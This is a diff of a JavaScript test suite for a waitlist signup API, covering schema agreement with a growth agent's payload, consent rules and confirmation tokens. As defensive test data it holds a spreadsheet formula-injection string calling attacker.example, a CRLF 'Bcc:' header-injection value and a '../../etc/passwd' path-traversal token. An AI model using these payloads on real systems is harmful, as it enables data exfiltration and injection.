@@ -683,143 +683,189 @@ await check('Error response never echoes submitted input', 'no email in body', a
   return { pass: !body.includes('canary-string'), actual: body };
 });
 
-// 21 — contract extension 2026-08-17
+// 21 — convergence with the Conversion agent's shipped vocabulary
+//
+// The single most valuable test in this file. It builds the EXACT payload
+// growth's buildPayload() emits — their key names, their enum values — and
+// asserts the server takes it whole. If either side renames a field or changes
+// an enum, this fails immediately instead of the drift being absorbed by their
+// downgrade path and surfacing months later as empty spreadsheet columns.
 {
   const { __resetInMemoryLimiter } = await import('../src/lib/ratelimit.js');
   __resetInMemoryLimiter();
-  const { validateWaitlist, resolveConsentText, sanitizeForSheet } = await import('../src/lib/validation.js');
+  const { validateWaitlist, sanitizeForSheet } = await import('../src/lib/validation.js');
 
-  const full = (o = {}) => ({
-    email: `x${Math.random().toString(36).slice(2, 8)}@gmail.com`,
+  const growthPayload = (o = {}) => ({
+    email: `g${Math.random().toString(36).slice(2, 8)}@gmail.com`,
+    zip: null,
+    motivation: ['gut_health'],
+    intent: 'very_interested',
+    price_band: '24_29',
+    flavor: 'both',
+    is_clinician: false,
+    referral_source: 'other',
     consent_marketing: true,
-    consent_text_version: '2026-08-15.marketing.a',
+    consent_health: true,
+    consent_text_version: 'mkt-eea-2026-08-15-0dd5ad8b',
+    motivation_consent_text_version: 'mot-eea-2026-08-17-53abe75d',
+    utm: { source: null, medium: null, campaign: null, content: null, term: null },
+    page_path: '/',
+    hp_field: null,
     form_render_ts: Date.now() - 9000,
+    motivation_other: null,
+    dietary: ['nut_allergy'],
+    dietary_other: null,
+    referral_source_other: 'Podcast',
+    quantity_band: '4_8',
+    channel: ['grocery'],
+    channel_other: null,
+    office_interest: 'maybe',
+    company_name: 'Acme AS',
+    company_headcount: '10_49',
+    research_optin: true,
+    consent_sms: true,
+    phone: '+4791234567',
+    sms_consent_text_version: 'sms-us-2026-08-17-43da99ea',
+    consent_mail: true,
+    address_line1: 'Storgata 1',
+    address_line2: null,
+    address_city: 'Oslo',
+    address_region: 'Oslo',
+    address_postal: '0150',
+    address_country: 'NO',
+    mail_consent_text_version: 'mail-eea-2026-08-17-e3c58485',
     ...o,
   });
 
-  // New enums
-  await check('quantity_band valid value accepted', '200', async () => {
-    const r = await post(full({ quantity_band: 'qty_2_3' }));
-    return { pass: r.status === 200, actual: String(r.status) };
-  });
-  await check('quantity_band invalid value rejected', '400', async () => {
-    const r = await post(full({ quantity_band: 'a_lot' }));
-    return { pass: r.status === 400, actual: String(r.status) };
-  });
-  await check('headcount + company + office_interest accepted', '200', async () => {
-    const r = await post(full({ office_interest: true, company: 'Acme AS', headcount: 'hc_11_50' }));
-    return { pass: r.status === 200, actual: String(r.status) };
-  });
-  await check('headcount invalid value rejected', '400', async () => {
-    const r = await post(full({ headcount: '50ish' }));
-    return { pass: r.status === 400, actual: String(r.status) };
+  await check("Growth's full payload accepted whole — no downgrade needed", '200', async () => {
+    const r = await post(growthPayload());
+    return { pass: r.status === 200, actual: `${r.status} ${JSON.stringify(r.json)}` };
   });
 
-  // *_other pairing
-  await check('motivation_other with "other" selected accepted', '200', async () => {
-    const r = await post(full({ consent_health: true, motivation: ['other'], motivation_other: 'Doctor suggested it', motivation_consent_text_version: '2026-08-15.health.a' }));
-    return { pass: r.status === 200, actual: String(r.status) };
-  });
-  await check('motivation_other WITHOUT "other" selected rejected', '400', async () => {
-    const r = await post(full({ consent_health: true, motivation: ['energy'], motivation_other: 'x' }));
-    return { pass: r.status === 400, actual: String(r.status) };
-  });
-  await check('referral_source_other WITHOUT "other" selected rejected', '400', async () => {
-    const r = await post(full({ referral_source: 'doctor', referral_source_other: 'x' }));
-    return { pass: r.status === 400, actual: String(r.status) };
+  await check('Every growth key is recognised by the schema', '0 unknown', async () => {
+    const v = validateWaitlist(growthPayload());
+    const unknown = v.ok ? [] : v.issues.filter((i) => String(i.code).includes('unrecognized'));
+    return { pass: v.ok, actual: v.ok ? 'all recognised' : JSON.stringify(v.issues) };
   });
 
-  // Free text: sanitising + caps
-  await check('Formula payload in company neutralised', "prefixed with '", async () => {
-    const out = sanitizeForSheet('=IMPORTXML("https://attacker.example","//a")');
-    return { pass: out.startsWith("'"), actual: out.slice(0, 32) + '…' };
-  });
-  await check('Formula payload in motivation_other neutralised', "prefixed with '", async () => {
-    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, consent_health: true, motivation: ['other'], motivation_other: '=1+1' });
-    return { pass: v.ok && sanitizeForSheet(v.data.motivation_other) === "'=1+1", actual: JSON.stringify(sanitizeForSheet(v.data?.motivation_other)) };
-  });
-  await check('company over 120 chars rejected', '400', async () => {
-    const r = await post(full({ company: 'A'.repeat(200) }));
-    return { pass: r.status === 400, actual: String(r.status) };
-  });
-  await check('CRLF in address_line1 rejected', '400', async () => {
-    const r = await post(full({ consent_postal: true, address_line1: 'Storgata 1\r\nBcc: v@e.com', address_city: 'Oslo', address_country: 'NO', postal_consent_text_version: '2026-08-17.postal.a' }));
-    return { pass: r.status === 400, actual: String(r.status) };
+  // THE ALARM. Once the schemas agree the downgrade path must never fire in
+  // normal operation. It stays in growth's client as an emergency valve; this
+  // asserts the valve is shut.
+  await check('ALARM: downgrade path does not fire for a normal submission', 'no downgrade', async () => {
+    const CORE = new Set(['email','zip','motivation','intent','price_band','flavor','is_clinician',
+      'referral_source','consent_marketing','consent_health','consent_text_version',
+      'motivation_consent_text_version','utm','page_path','hp_field','form_render_ts']);
+    const p = growthPayload();
+    const r = await post(p);
+    // growth downgrades on 400-with-extensions; a 200 means it never triggers.
+    const wouldDowngrade = r.status === 400 && Object.entries(p).some(([k, v]) => !CORE.has(k) && v !== null && v !== false);
+    return {
+      pass: r.status === 200 && !wouldDowngrade,
+      actual: wouldDowngrade ? 'WOULD DOWNGRADE — schemas have drifted' : 'valve shut',
+    };
   });
 
-  // Phone — strict, unlike zip
-  await check('Valid E.164 phone accepted and normalised', '+4791234567', async () => {
-    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, phone: '+47 912 34 567', consent_sms: true, sms_consent_text_version: '2026-08-17.sms.a' });
-    return { pass: v.ok && v.data.phone === '+4791234567', actual: JSON.stringify(v.data?.phone ?? v.issues) };
+  await check('A declared downgrade is recorded, not silently absorbed', 'flagged', async () => {
+    const r = await post(growthPayload({ downgraded_fields: ['dietary', 'channel'] }));
+    return { pass: r.status === 200, actual: `${r.status} (log: reject.downgraded_payload)` };
   });
-  for (const bad of ['12345', '+0912345678', 'not a phone', '+4']) {
-    await check(`Phone "${bad}" rejected (strict, not soft like zip)`, '400', async () => {
-      const r = await post(full({ phone: bad }));
-      return { pass: r.status === 400, actual: String(r.status) };
+
+  // Enum values, growth's set
+  for (const [f, good, bad] of [
+    ['quantity_band', '9_16', 'qty_4_6'],
+    ['company_headcount', '50_199', 'hc_51_200'],
+    ['office_interest', 'maybe', true],
+    ['channel', ['office'], ['pharmacy']],
+    ['dietary', ['vegan'], ['keto']],
+  ]) {
+    await check(`${f}: growth value accepted, my old value rejected`, '200 / 400', async () => {
+      const a = await post(growthPayload({ [f]: good }));
+      const b = await post(growthPayload({ [f]: bad }));
+      return { pass: a.status === 200 && b.status === 400, actual: `${a.status} / ${b.status}` };
     });
   }
 
-  // Consent gating
-  await check('consent_sms without a phone rejected', '400', async () => {
-    const r = await post(full({ consent_sms: true }));
-    return { pass: r.status === 400, actual: String(r.status) };
-  });
-  await check('consent_postal without an address rejected', '400', async () => {
-    const r = await post(full({ consent_postal: true }));
-    return { pass: r.status === 400, actual: String(r.status) };
-  });
-  await check('Phone supplied WITHOUT sms consent is not stored', 'dropped', async () => {
-    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, phone: '+4791234567' });
-    const stored = v.ok && v.data.consent_sms ? v.data.phone : null;
-    return { pass: v.ok && stored === null, actual: `consent_sms=${v.data?.consent_sms}, stored=${JSON.stringify(stored)}` };
-  });
-  await check('Address supplied WITHOUT postal consent is not stored', 'dropped', async () => {
-    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, address_line1: 'Storgata 1', address_city: 'Oslo', address_country: 'NO' });
-    const stored = v.ok && v.data.consent_postal ? v.data.address_line1 : null;
+  // *_other pairing across all four enums
+  for (const [field, withParent, withoutParent] of [
+    ['motivation_other', { motivation: ['other'] }, { motivation: ['energy'] }],
+    ['referral_source_other', { referral_source: 'other' }, { referral_source: 'doctor' }],
+    ['dietary_other', { dietary: ['other'] }, { dietary: ['vegan'] }],
+    ['channel_other', { channel: ['other'] }, { channel: ['grocery'] }],
+  ]) {
+    await check(`${field} requires its parent "other"`, '200 paired / 400 unpaired', async () => {
+      const a = await post(growthPayload({ [field]: 'typed answer', ...withParent }));
+      const b = await post(growthPayload({ [field]: 'typed answer', ...withoutParent }));
+      return { pass: a.status === 200 && b.status === 400, actual: `${a.status} / ${b.status}` };
+    });
+  }
+
+  await check('dietary is Art 9 — dropped without consent_health', 'dropped', async () => {
+    const v = validateWaitlist(growthPayload({ consent_health: false, motivation: null, motivation_consent_text_version: null, dietary: ['nut_allergy'] }));
+    const stored = v.ok && v.data.consent_health ? v.data.dietary : null;
     return { pass: v.ok && stored === null, actual: JSON.stringify(stored) };
   });
 
-  // International postal code inside the address block — NOT the US-only zip
-  for (const [code, where] of [['0150', 'Norway'], ['SW1A 1AA', 'UK'], ['01000-000', 'Brazil'], ['94305', 'US']]) {
-    await check(`address_postal_code "${code}" (${where}) accepted`, '200', async () => {
-      const r = await post(full({ consent_postal: true, address_line1: 'A 1', address_city: 'C', address_country: 'NO', address_postal_code: code, postal_consent_text_version: '2026-08-17.postal.a' }));
-      return { pass: r.status === 200, actual: String(r.status) };
-    });
-  }
+  await check('Formula payload in company_name neutralised', "prefixed with '", async () => {
+    const out = sanitizeForSheet('=IMPORTXML("https://attacker.example","//a")');
+    return { pass: out.startsWith("'"), actual: out.slice(0, 30) + '…' };
+  });
 
-  // Receipt shape
-  await check('Receipt v3 carries all four consents, each with its own version', 'v3', async () => {
-    const names = ['marketing', 'health', 'sms', 'postal'];
-    const resolved = {
-      marketing: resolveConsentText('2026-08-15.marketing.a', 'marketing'),
-      health: resolveConsentText('2026-08-15.health.a', 'health'),
-      sms: resolveConsentText('2026-08-17.sms.a', 'sms'),
-      postal: resolveConsentText('2026-08-17.postal.a', 'postal'),
-    };
-    const distinct = new Set(names.map((n) => resolved[n].version)).size === 4;
-    const allText = names.every((n) => typeof resolved[n].text === 'string' && resolved[n].text.length > 10);
-    const allMatched = names.every((n) => resolved[n].registry_match);
-    return { pass: distinct && allText && allMatched, actual: `distinct=${distinct} text=${allText} registered=${allMatched}` };
+  await check('Response carries both count and position', 'aliases agree', async () => {
+    // Without an upstream configured the endpoint omits both; assert the shape
+    // contract instead of a live number.
+    const r = await post(growthPayload());
+    const b = r.json ?? {};
+    const ok = b.ok === true && (b.count === undefined ? b.position === undefined : b.count === b.position);
+    return { pass: ok, actual: JSON.stringify(b) };
   });
 
   await check('Server-derived fields still rejected from the client', '400', async () => {
     const codes = await Promise.all([
-      post(full({ consent_receipt: '{}' })),
-      post(full({ needs_reconsent: false })),
-      post(full({ consent_regime_status: 'ok' })),
+      post(growthPayload({ country: 'NO' })),
+      post(growthPayload({ consent_timestamp: '1999-01-01T00:00:00Z' })),
+      post(growthPayload({ confirmed: true })),
+      post(growthPayload({ email_handle: 'deadbeef1234' })),
     ]);
     return { pass: codes.every((r) => r.status === 400), actual: codes.map((r) => r.status).join(',') };
   });
+}
 
-  await check('Leniency still confined to zip after the extension', '400 on all', async () => {
-    const codes = await Promise.all([
-      post(full({ quantity_band: 'nope' })),
-      post(full({ headcount: 'nope' })),
-      post(full({ address_country: 'NORWAY' })),
-      post(full({ address_postal_code: '!!!' })),
-      post(full({ flavor: 'nope' })),
-    ]);
-    return { pass: codes.every((r) => r.status === 400), actual: codes.map((r) => r.status).join(',') };
+// 22 — confirmed opt-in tokens
+{
+  process.env.CONFIRM_TOKEN_SECRET = 'a'.repeat(64);
+  const { mintConfirmToken, verifyConfirmToken, CONFIRM_TTL_MS } = await import('../api/confirm.js');
+
+  await check('Minted token verifies', 'valid', async () => {
+    const t = await mintConfirmToken('kari@example.no');
+    const v = await verifyConfirmToken(t);
+    return { pass: Boolean(v) && !v.expired, actual: JSON.stringify(v) };
+  });
+  await check('Token contains no email address', 'handle only', async () => {
+    const t = await mintConfirmToken('kari@example.no');
+    return { pass: !t.includes('kari') && !t.includes('@'), actual: t.slice(0, 26) + '…' };
+  });
+  await check('Tampered signature rejected', 'null', async () => {
+    const t = await mintConfirmToken('kari@example.no');
+    const v = await verifyConfirmToken(t.slice(0, -1) + (t.endsWith('A') ? 'B' : 'A'));
+    return { pass: v === null, actual: JSON.stringify(v) };
+  });
+  await check('Tampered handle rejected', 'null', async () => {
+    const t = await mintConfirmToken('kari@example.no');
+    const v = await verifyConfirmToken('ffffffffffff' + t.slice(12));
+    return { pass: v === null, actual: JSON.stringify(v) };
+  });
+  await check('Expired token detected, not silently accepted', 'expired', async () => {
+    const t = await mintConfirmToken('kari@example.no', Date.now() - CONFIRM_TTL_MS - 1000);
+    const v = await verifyConfirmToken(t);
+    return { pass: v?.expired === true, actual: JSON.stringify(v) };
+  });
+  await check('Garbage token rejected', 'null', async () => {
+    const results = await Promise.all(['', 'x', 'a.b.c', '../../etc/passwd', 'a'.repeat(500)].map((t) => verifyConfirmToken(t)));
+    return { pass: results.every((v) => v === null), actual: JSON.stringify(results) };
+  });
+  await check('Different emails mint different tokens', 'distinct', async () => {
+    const [a, b] = await Promise.all([mintConfirmToken('a@x.com'), mintConfirmToken('b@x.com')]);
+    return { pass: a !== b, actual: 'distinct' };
   });
 }
 
